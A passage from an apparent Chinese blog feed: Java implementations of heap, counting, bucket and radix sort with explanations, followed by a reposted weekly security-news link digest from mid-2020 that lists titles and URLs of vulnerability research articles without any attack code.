&#x2F;&#x2F; 设定基准值（pivot）</span><br><span class="line">        int pivot &#x3D; left;</span><br><span class="line">        int index &#x3D; pivot + 1;</span><br><span class="line">        for (int i &#x3D; index; i &lt;&#x3D; right; i++) &#123;</span><br><span class="line">            if (arr[i] &lt; arr[pivot]) &#123;</span><br><span class="line">                swap(arr, i, index);</span><br><span class="line">                index++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        swap(arr, pivot, index - 1);</span><br><span class="line">        return index - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void swap(int[] arr, int i, int j) &#123;</span><br><span class="line">        int temp &#x3D; arr[i];</span><br><span class="line">        arr[i] &#x3D; arr[j];</span><br><span class="line">        arr[j] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a><strong>堆排序</strong></h3><p>堆排序（Heapsort）是指利用堆这种数据结构所设计的一种排序算法。堆积是一个近似完全二叉树的结构，并同时满足堆积的性质：即子结点的键值或索引总是小于（或者大于）它的父节点。堆排序可以说是一种利用堆的概念来排序的选择排序。分为两种方法：</p><ol><li>大顶堆：每个节点的值都大于或等于其子节点的值，在堆排序算法中用于升序排列；</li><li>小顶堆：每个节点的值都小于或等于其子节点的值，在堆排序算法中用于降序排列；</li></ol><p>堆排序的平均时间复杂度为 Ο(nlogn)。</p><p><strong>1. 算法步骤</strong></p><ol><li>创建一个堆 H[0……n-1]；</li><li>把堆首（最大值）和堆尾互换；</li><li>把堆的尺寸缩小 1，并调用 shift_down(0)，目的是把新的数组顶端数据调整到相应位置；</li><li>重复步骤 2，直到堆的尺寸为 1。</li></ol><p><strong>2. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203709.gif" alt="微信图片_20200929203709"></p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">public class HeapSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        int len &#x3D; arr.length;</span><br><span class="line"></span><br><span class="line">        buildMaxHeap(arr, len);</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; len - 1; i &gt; 0; i--) &#123;</span><br><span class="line">            swap(arr, 0, i);</span><br><span class="line">            len--;</span><br><span class="line">            heapify(arr, 0, len);</span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void buildMaxHeap(int[] arr, int len) &#123;</span><br><span class="line">        for (int i &#x3D; (int) Math.floor(len &#x2F; 2); i &gt;&#x3D; 0; i--) &#123;</span><br><span class="line">            heapify(arr, i, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void heapify(int[] arr, int i, int len) &#123;</span><br><span class="line">        int left &#x3D; 2 * i + 1;</span><br><span class="line">        int right &#x3D; 2 * i + 2;</span><br><span class="line">        int largest &#x3D; i;</span><br><span class="line"></span><br><span class="line">        if (left &lt; len &amp;&amp; arr[left] &gt; arr[largest]) &#123;</span><br><span class="line">            largest &#x3D; left;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (right &lt; len &amp;&amp; arr[right] &gt; arr[largest]) &#123;</span><br><span class="line">            largest &#x3D; right;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (largest !&#x3D; i) &#123;</span><br><span class="line">            swap(arr, i, largest);</span><br><span class="line">            heapify(arr, largest, len);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void swap(int[] arr, int i, int j) &#123;</span><br><span class="line">        int temp &#x3D; arr[i];</span><br><span class="line">        arr[i] &#x3D; arr[j];</span><br><span class="line">        arr[j] &#x3D; temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a><strong>计数排序</strong></h3><p>计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。</p><p><strong>1. 动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203713.gif" alt="微信图片_20200929203713"></p><p><strong>2. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public class CountingSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        int maxValue &#x3D; getMaxValue(arr);</span><br><span class="line"></span><br><span class="line">        return countingSort(arr, maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int[] countingSort(int[] arr, int maxValue) &#123;</span><br><span class="line">        int bucketLen &#x3D; maxValue + 1;</span><br><span class="line">        int[] bucket &#x3D; new int[bucketLen];</span><br><span class="line"></span><br><span class="line">        for (int value : arr) &#123;</span><br><span class="line">            bucket[value]++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int sortedIndex &#x3D; 0;</span><br><span class="line">        for (int j &#x3D; 0; j &lt; bucketLen; j++) &#123;</span><br><span class="line">            while (bucket[j] &gt; 0) &#123;</span><br><span class="line">                arr[sortedIndex++] &#x3D; j;</span><br><span class="line">                bucket[j]--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int getMaxValue(int[] arr) &#123;</span><br><span class="line">        int maxValue &#x3D; arr[0];</span><br><span class="line">        for (int value : arr) &#123;</span><br><span class="line">            if (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue &#x3D; value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a><strong>桶排序</strong></h3><p>桶排序是计数排序的升级版。它利用了函数的映射关系，高效与否的关键就在于这个映射函数的确定。为了使桶排序更加高效，我们需要做到这两点：</p><ol><li>在额外空间充足的情况下，尽量增大桶的数量</li><li>使用的映射函数能够将输入的 N 个数据均匀的分配到 K 个桶中</li></ol><p>同时，对于桶中元素的排序，选择何种比较排序算法对于性能的影响至关重要。</p><p><strong>1. 什么时候最快</strong></p><p>当输入的数据可以均匀的分配到每一个桶中。</p><p><strong>2. 什么时候最慢</strong></p><p>当输入的数据被分配到了同一个桶中。</p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">public class BucketSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    private static final InsertSort insertSort &#x3D; new InsertSort();</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        return bucketSort(arr, 5);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int[] bucketSort(int[] arr, int bucketSize) throws Exception &#123;</span><br><span class="line">        if (arr.length &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return arr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int minValue &#x3D; arr[0];</span><br><span class="line">        int maxValue &#x3D; arr[0];</span><br><span class="line">        for (int value : arr) &#123;</span><br><span class="line">            if (value &lt; minValue) &#123;</span><br><span class="line">                minValue &#x3D; value;</span><br><span class="line">            &#125; else if (value &gt; maxValue) &#123;</span><br><span class="line">                maxValue &#x3D; value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int bucketCount &#x3D; (int) Math.floor((maxValue - minValue) &#x2F; bucketSize) + 1;</span><br><span class="line">        int[][] buckets &#x3D; new int[bucketCount][0];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 利用映射函数将数据分配到各个桶中</span><br><span class="line">        for (int i &#x3D; 0; i &lt; arr.length; i++) &#123;</span><br><span class="line">            int index &#x3D; (int) Math.floor((arr[i] - minValue) &#x2F; bucketSize);</span><br><span class="line">            buckets[index] &#x3D; arrAppend(buckets[index], arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int arrIndex &#x3D; 0;</span><br><span class="line">        for (int[] bucket : buckets) &#123;</span><br><span class="line">            if (bucket.length &lt;&#x3D; 0) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F; 对每个桶进行排序，这里使用了插入排序</span><br><span class="line">            bucket &#x3D; insertSort.sort(bucket);</span><br><span class="line">            for (int value : bucket) &#123;</span><br><span class="line">                arr[arrIndex++] &#x3D; value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自动扩容，并保存数据</span><br><span class="line">     *</span><br><span class="line">     * @param arr</span><br><span class="line">     * @param value</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private int[] arrAppend(int[] arr, int value) &#123;</span><br><span class="line">        arr &#x3D; Arrays.copyOf(arr, arr.length + 1);</span><br><span class="line">        arr[arr.length - 1] &#x3D; value;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a><strong>基数排序</strong></h3><p>基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。</p><p><strong>1. 基数排序 vs 计数排序 vs 桶排序</strong></p><p>基数排序有两种方法：</p><p>这三种排序算法都利用了桶的概念，但对桶的使用方法上有明显差异：</p><ul><li>基数排序：根据键值的每位数字来分配桶；</li><li>计数排序：每个桶只存储单一键值；</li><li>桶排序：每个桶存储一定范围的数值；</li></ul><p><strong>2. LSD 基数排序动图演示</strong></p><p><img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200929203719.gif" alt="微信图片_20200929203719"></p><p><strong>3. Java 代码实现</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 基数排序</span><br><span class="line"> * 考虑负数的情况还可以参考： https:&#x2F;&#x2F;code.i-harness.com&#x2F;zh-CN&#x2F;q&#x2F;e98fa9</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class RadixSort implements IArraySort &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public int[] sort(int[] sourceArray) throws Exception &#123;</span><br><span class="line">        &#x2F;&#x2F; 对 arr 进行拷贝，不改变参数内容</span><br><span class="line">        int[] arr &#x3D; Arrays.copyOf(sourceArray, sourceArray.length);</span><br><span class="line"></span><br><span class="line">        int maxDigit &#x3D; getMaxDigit(arr);</span><br><span class="line">        return radixSort(arr, maxDigit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 获取最高位数</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private int getMaxDigit(int[] arr) &#123;</span><br><span class="line">        int maxValue &#x3D; getMaxValue(arr);</span><br><span class="line">        return getNumLenght(maxValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int getMaxValue(int[] arr) &#123;</span><br><span class="line">        int maxValue &#x3D; arr[0];</span><br><span class="line">        for (int value : arr) &#123;</span><br><span class="line">            if (maxValue &lt; value) &#123;</span><br><span class="line">                maxValue &#x3D; value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return maxValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected int getNumLenght(long num) &#123;</span><br><span class="line">        if (num &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        int lenght &#x3D; 0;</span><br><span class="line">        for (long temp &#x3D; num; temp !&#x3D; 0; temp &#x2F;&#x3D; 10) &#123;</span><br><span class="line">            lenght++;</span><br><span class="line">        &#125;</span><br><span class="line">        return lenght;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private int[] radixSort(int[] arr, int maxDigit) &#123;</span><br><span class="line">        int mod &#x3D; 10;</span><br><span class="line">        int dev &#x3D; 1;</span><br><span class="line"></span><br><span class="line">        for (int i &#x3D; 0; i &lt; maxDigit; i++, dev *&#x3D; 10, mod *&#x3D; 10) &#123;</span><br><span class="line">            &#x2F;&#x2F; 考虑负数的情况，这里扩展一倍队列数，其中 [0-9]对应负数，[10-19]对应正数 (bucket + 10)</span><br><span class="line">            int[][] counter &#x3D; new int[mod * 2][0];</span><br><span class="line"></span><br><span class="line">            for (int j &#x3D; 0; j &lt; arr.length; j++) &#123;</span><br><span class="line">                int bucket &#x3D; ((arr[j] % mod) &#x2F; dev) + mod;</span><br><span class="line">                counter[bucket] &#x3D; arrayAppend(counter[bucket], arr[j]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            int pos &#x3D; 0;</span><br><span class="line">            for (int[] bucket : counter) &#123;</span><br><span class="line">                for (int value : bucket) &#123;</span><br><span class="line">                    arr[pos++] &#x3D; value;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自动扩容，并保存数据</span><br><span class="line">     *</span><br><span class="line">     * @param arr</span><br><span class="line">     * @param value</span><br><span class="line">     *&#x2F;</span><br><span class="line">    private int[] arrayAppend(int[] arr, int value) &#123;</span><br><span class="line">        arr &#x3D; Arrays.copyOf(arr, arr.length + 1);</span><br><span class="line">        arr[arr.length - 1] &#x3D; value;</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.7.27-8.2一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.7.27-8.2%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.7.27-8.2%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-7-27-8-2一周安全知识动态"><a href="#2020-7-27-8-2一周安全知识动态" class="headerlink" title="2020.7.27-8.2一周安全知识动态"></a>2020.7.27-8.2一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Coverage Guided Fuzzing in Go</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;alexplaskett.github.io&#x2F;coverage-guided-fuzzing-golang&#x2F;对Go语言的基于反馈的fuzz</span><br></pre></td></tr></table></figure><p>•Fuzzing software: advanced tricks (Part 2)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securitylab.github.com&#x2F;research&#x2F;fuzzing-software-2Fuzzing软件：高级技巧第二部分</span><br></pre></td></tr></table></figure><h3 id="漏洞利用相关"><a href="#漏洞利用相关" class="headerlink" title="漏洞利用相关"></a>漏洞利用相关</h3><p>•Root Cause Analyses for 0-day In-the-Wild Exploits</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;07&#x2F;root-cause-analyses-for-0-day-in-wild.htmlproject zero关于在野0day利用情况的分析</span><br></pre></td></tr></table></figure><p>•Detection Deficit: A Year in Review of 0-days Used In-The-Wild in 2019</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;googleprojectzero.blogspot.com&#x2F;2020&#x2F;07&#x2F;detection-deficit-year-in-review-of-0.html2019年在野0day利用回顾</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Speculation in JavaScriptCore</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;webkit.org&#x2F;blog&#x2F;10308&#x2F;speculation-in-javascriptcore&#x2F;jsc官博上关于优化推断技术实现的介绍</span><br></pre></td></tr></table></figure><p>•Issue 1072171: Security: missing the -0 case when intersecting and computing the Type::Range in NumberMax</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;chromium&#x2F;issues&#x2F;detail?id&#x3D;1072171V8 NumberMaxType漏洞</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•Heap Exploitation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;glibc堆利用电子书</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•Authorization bypass in Google’s ticketing system (Google-GUTS)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ehpus.com&#x2F;post&#x2F;authorization-bypass-in-google-s-ticketing-system绕过谷歌ticketing系统</span><br></pre></td></tr></table></figure><p>•Expert release a PoC exploit code for a recently addressed critical flaw in Microsoft SharePoint, .NET Framework, and Visual Studio</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securityaffairs.co&#x2F;wordpress&#x2F;106281&#x2F;hacking&#x2F;cve-2020-1147-poc-sharepoint.html?utm_source&#x3D;dlvr.it&amp;utm_medium&#x3D;twitter&amp;utm_campaign&#x3D;cve-2020-1147-poc-sharepointCVE-2020-1147 poc公布</span><br></pre></td></tr></table></figure><p>•How I bypassed 2fa in a 3 years old private program!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;shivangx01b.github.io&#x2F;2fa_bypass&#x2F;双因子认证绕过技术</span><br></pre></td></tr></table></figure><p>•Discovering Buffer overflows in NodeJS core</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@social_62682&#x2F;discovering-buffer-overflows-in-nodejs-core-b4af76c00bbaNodeJS core中的缓冲区溢出漏洞</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•STORSVC WRITEUP AND INTRODUCTION ABOUT MY ANALYSIS SCRIPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;whereisk0shl.top&#x2F;post&#x2F;storsvc_writeup_and_introduction_about_my_analysis_scriptk0shl关于kernel分析的脚本以及本地提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Setting Up An Android VM For Analyzing Mobile Applications</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;1d8&#x2F;Android-Analysis安卓app分析环境设置</span><br></pre></td></tr></table></figure><p>•Exploiting popular macOS apps with a single “.terminal” file.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@metnew&#x2F;exploiting-popular-macos-apps-with-a-single-terminal-file-f6c2efdfedaa通过“.terminal” file攻击macOS app</span><br></pre></td></tr></table></figure><p>•Seeing (Sig)Red</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sensepost.com&#x2F;blog&#x2F;2020&#x2F;seeing-sigred&#x2F;如何检测SigRed(CVE-2020-1350) 漏洞</span><br></pre></td></tr></table></figure><p>•CVE-2020-1313</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;irsl&#x2F;CVE-2020-1313WindowsUpdateOrchestratorService本地提权漏洞</span><br></pre></td></tr></table></figure><p>•Grubbing Secure Boot the Wrong Way: CVE-2020-10713</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;capsule8.com&#x2F;blog&#x2F;grubbing-secure-boot-the-wrong-way-cve-2020-10713&#x2F;CVE-2020-10713GrubbingSecureBoot漏洞分析</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.8.3-8.9一周安全知识动态</title>
      <link href="/2020/09/29/%5B%E8%BD%AC%5D2020.8.3-8.9%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/09/29/%5B%E8%BD%AC%5D2020.8.3-8.9%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
